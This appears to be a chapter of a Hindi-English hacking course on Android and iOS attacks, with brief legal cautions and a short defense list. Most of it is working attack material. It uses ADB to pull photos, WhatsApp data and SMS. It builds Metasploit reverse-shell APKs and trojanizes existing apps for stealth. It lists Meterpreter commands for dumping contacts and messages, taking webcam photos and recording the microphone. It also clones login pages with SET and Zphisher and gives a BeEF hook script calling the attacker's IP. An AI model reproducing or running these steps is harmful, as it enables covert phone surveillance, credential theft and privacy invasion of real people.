# 📱 Phase 7 — Mobile Hacking: Android & iOS Security

> Mobile = sabse zyada personal data. Contacts, photos, messages, location, banking — sab phone mein hai.
> Mobile security testing is a HIGH-DEMAND skill.

> [!CAUTION]
> Mobile hacking sirf **AUTHORIZED testing** aur **your own devices** pe karo!
> Kisi ka phone hack karna = IT Act Section 66 + Privacy violation = **SERIOUS CRIME**

---

## 🤖 Android Exploitation

### Android Architecture (Samajh le pehle)

```
┌─────────────────────────────┐
│  Applications               │  ← Your target (apps, data)
├─────────────────────────────┤
│  Application Framework      │  ← APIs, managers
├─────────────────────────────┤
│  Android Runtime (ART)      │  ← Runs apps
├─────────────────────────────┤
│  Native Libraries           │  ← C/C++ libraries
├─────────────────────────────┤
│  Linux Kernel               │  ← Base OS
└─────────────────────────────┘

Important paths:
/data/data/<package>/      → App private data
/data/data/<package>/databases/  → App databases (SQLite)
/data/data/<package>/shared_prefs/ → App settings/tokens
/sdcard/                   → External storage (accessible)
/system/                   → System files
```

### ADB (Android Debug Bridge) — Phone Access Tool

```bash
# ═══════════════════════════════════════════════
# ADB Setup in Kali
# ═══════════════════════════════════════════════
sudo apt install -y adb

# Connect via USB (enable USB Debugging on phone first)
# Settings → Developer Options → USB Debugging ON
adb devices                      # list connected devices

# Connect wirelessly
adb tcpip 5555                   # set phone to listen on 5555
adb connect PHONE_IP:5555        # connect over WiFi

# ═══════════════════════════════════════════════
# ADB COMMANDS — Full Device Access
# ═══════════════════════════════════════════════

# Shell access
adb shell                        # open phone shell
adb shell whoami                 # current user
adb shell id                     # user details

# File operations
adb pull /sdcard/DCIM/           # download all photos!
adb pull /sdcard/Download/       # download all downloads
adb pull /sdcard/WhatsApp/       # WhatsApp media & backups!
adb push payload.apk /sdcard/    # upload file to phone

# Install/Uninstall apps
adb install malicious.apk        # install APK
adb install -r app.apk           # reinstall (overwrite)
adb uninstall com.package.name   # uninstall app

# Screenshot & Screen recording
adb shell screencap /sdcard/screenshot.png
adb pull /sdcard/screenshot.png
adb shell screenrecord /sdcard/video.mp4
adb pull /sdcard/video.mp4

# App data extraction (requires root or debuggable app)
adb shell pm list packages       # list all installed apps
adb shell pm path com.whatsapp   # find APK path
adb pull /data/data/com.whatsapp/  # pull app data (needs root)

# Call/SMS logs (rooted phone)
adb shell content query --uri content://sms/inbox
adb shell content query --uri content://call_log/calls

# Dump phone info
adb shell dumpsys battery         # battery info
adb shell dumpsys wifi            # WiFi info
adb shell dumpsys telephony.registry  # SIM/network info
adb shell getprop                 # all system properties

# Key events (simulate taps, swipes)
adb shell input keyevent 26      # power button
adb shell input keyevent 3       # home button
adb shell input text "hello"     # type text
adb shell input tap 500 500      # tap at coordinates

# Backup everything
adb backup -all -f full_backup.ab
```

### Creating Android Payload with Metasploit

```bash
# ═══════════════════════════════════════════════
# Generate malicious APK
# ═══════════════════════════════════════════════
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -o evil_app.apk

# ═══════════════════════════════════════════════
# Inject payload into EXISTING APK (more stealthy!)
# ═══════════════════════════════════════════════
# Using msfvenom with template:
msfvenom -x original_app.apk \
  -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -o trojanized_app.apk

# Sign the APK (required for installation)
keytool -genkey -v -keystore my-key.keystore -alias mykey \
  -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore my-key.keystore trojanized_app.apk mykey

# ═══════════════════════════════════════════════
# Set up listener
# ═══════════════════════════════════════════════
msfconsole -q
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit

# ═══════════════════════════════════════════════
# ONCE YOU GET ANDROID METERPRETER SESSION:
# ═══════════════════════════════════════════════
sysinfo                          # phone info
dump_contacts                    # ALL contacts!
dump_sms                         # ALL text messages!
dump_calllog                     # ALL call history!
geolocate                        # GPS location!
webcam_list                      # list cameras
webcam_snap                      # take photo!
webcam_stream                    # live camera stream
record_mic -d 60                 # record microphone 60 sec
check_root                       # is phone rooted?
send_sms -d "+91XXXXXXXXXX" -t "Test"  # send SMS from their phone
activity_start --action android.intent.action.VIEW -d "http://YOUR_IP"

# App listing
app_list                         # list installed apps
app_run com.package.name         # start an app
app_uninstall com.package.name   # uninstall app
```

### Mobile App Pentesting (Static Analysis)

```bash
# ═══════════════════════════════════════════════
# Decompile APK & analyze code
# ═══════════════════════════════════════════════

# JADX — Best Java decompiler
sudo apt install -y jadx
jadx-gui target_app.apk          # GUI mode
jadx target_app.apk -d output/   # CLI mode

# What to look for:
# - Hardcoded API keys, passwords, secrets
# - Insecure HTTP endpoints
# - Firebase URLs
# - AWS/Azure credentials
# - JWT tokens
# - Debug mode enabled

# apktool — Resource extraction
sudo apt install -y apktool
apktool d target_app.apk -o decompiled/
# Check AndroidManifest.xml for:
# - Exported activities (accessible without auth!)
# - Backup allowed (android:allowBackup="true")
# - Debuggable (android:debuggable="true")
# - Custom URL schemes
# - Permissions

# MobSF — Mobile Security Framework (automated!)
# Best automated mobile analysis tool
sudo docker pull opensecurity/mobile-security-framework-mobsf
sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Open: http://localhost:8000
# Upload APK → automatic analysis!

# Frida — Dynamic analysis & hooking
pip3 install frida-tools
# On rooted Android:
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Bypass SSL pinning with Frida:
frida -U -f com.target.app -l ssl_bypass.js --no-pause
```

---

## 🍎 iOS Security (Overview)

```
iOS is harder to hack because:
- Stronger sandboxing
- App Store review
- No sideloading (without jailbreak)
- Hardware security (Secure Enclave)

But still possible:
1. Jailbreak → Install Cydia → Full access
2. Network-level attacks (MITM on WiFi)  
3. Phishing (fake login pages)
4. MDM (Mobile Device Management) exploitation
5. Web-based exploits through Safari

Tools for iOS:
- Checkra1n (jailbreak tool)
- Frida (dynamic analysis)
- objection (runtime manipulation)
- iProxy/iRelay (traffic interception)
```

---

## 🌐 Link-Based Phone Attacks (Phishing)

### Credential Harvesting via Link

```bash
# ═══════════════════════════════════════════════
# Social Engineering Toolkit (SET) — Credential Harvester
# ═══════════════════════════════════════════════
sudo setoolkit

# Menu: 
# 1 → Social Engineering Attacks
# 2 → Website Attack Vectors  
# 3 → Credential Harvester Attack
# 2 → Site Cloner
# Enter YOUR IP
# Enter URL to clone (e.g., https://accounts.google.com)

# Send link to target: http://YOUR_IP
# They see Google login → enter credentials → YOU capture them!

# ═══════════════════════════════════════════════
# Zphisher — Automated phishing tool (30+ templates!)
# ═══════════════════════════════════════════════
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
bash zphisher.sh

# Select template:
# Instagram, Facebook, Google, Netflix, PayPal, etc.
# Generates phishing page + ngrok tunnel
# Send the link → victim enters creds → YOU see them!

# ═══════════════════════════════════════════════  
# Gophish — Professional phishing framework
# ═══════════════════════════════════════════════
# Download from: https://getgophish.com/
# Professional phishing campaigns with:
# - Email templates
# - Landing pages
# - Tracking (who clicked, who submitted)
# - Reporting
```

### Browser-Based Attacks

```bash
# ═══════════════════════════════════════════════
# BeEF — Browser Exploitation Framework
# ═══════════════════════════════════════════════
sudo apt install -y beef-xss
sudo beef-xss

# Access: http://127.0.0.1:3000/ui/panel
# Login: beef / beef

# Hook: <script src="http://YOUR_IP:3000/hook.js"></script>
# Inject this via XSS or phishing page
# Once browser is hooked, you can:
# - Get browser info, plugins, cookies
# - Redirect browser
# - Social engineering popups
# - Port scan internal network through browser
# - Capture webcam/mic (with permission popup)
# - Keylogging
# - Clipboard theft
```

---

## 📱 Mobile Security Tools Summary

```
ANDROID TOOLS:
├── ADB — Direct phone control
├── Metasploit — Generate Android payloads
├── MobSF — Automated APK analysis
├── JADX — Decompile APK to Java source
├── apktool — Extract APK resources
├── Frida — Dynamic analysis & hooking
├── Drozer — Android security framework
├── Objection — Runtime manipulation
└── AndroBugs — Vulnerability scanner

PHISHING/SOCIAL ENGINEERING:
├── SET — Social Engineering Toolkit
├── Zphisher — Automated phishing
├── Gophish — Professional phishing
├── BeEF — Browser exploitation
└── King Phisher — Phishing campaigns
```

---

## 🎥 Phase 7 Videos

```
1. "Android Hacking Course" — HackerSploit (Full playlist)
   https://www.youtube.com/watch?v=M5-yOfkVkKg

2. "Android Hacking with Metasploit" — Zaid Sabih
   https://www.youtube.com/watch?v=xKLdvsmFM_c

3. "Mobile App Pentesting" — TCM Security
   https://www.youtube.com/watch?v=_HRpd2x22SE

4. "Frida Tutorial" — HackerSploit
   https://www.youtube.com/watch?v=iMNs8YAy6pk

5. "MobSF Tutorial" — Infosec
   https://www.youtube.com/watch?v=TJmD3kD6_7s

6. "BeEF Framework Tutorial" — HackerSploit
   https://www.youtube.com/watch?v=ngnplEAvpag

7. "Phishing with Gophish" — David Bombal
   https://www.youtube.com/watch?v=S6S5JF6Gou0
```

---

## 🛡️ How to DEFEND Against Mobile Attacks

```
AS A WHITE HAT, TEACH PEOPLE THESE DEFENSES:
1. Don't install APKs from unknown sources
2. Keep phone updated
3. Don't click unknown links
4. Use 2FA on everything
5. Check app permissions
6. Use a password manager
7. Don't connect to public WiFi without VPN
8. Enable Find My Device
9. Encrypt your phone (Settings → Security)
10. Don't enable USB Debugging unless needed
```

---

## ✅ Phase 7 Checklist

```
ANDROID
[ ] Can use ADB for device control
[ ] Can extract data (contacts, SMS, photos)
[ ] Can generate Android payloads with Metasploit
[ ] Can decompile APKs and find secrets
[ ] Can use MobSF for automated analysis
[ ] Understand Frida for dynamic analysis

PHISHING
[ ] Can create convincing phishing pages (SET, Zphisher)
[ ] Can use Gophish for campaigns
[ ] Can use BeEF for browser exploitation
[ ] Understand link-based attack vectors

DEFENSE
[ ] Can explain mobile security best practices
[ ] Can advise on app security
[ ] Understand mobile threat landscape
```

---

> **Phase 7 done? → [Phase 8 — Social Engineering](./Phase8_Social_Engineering.md)** 🎭
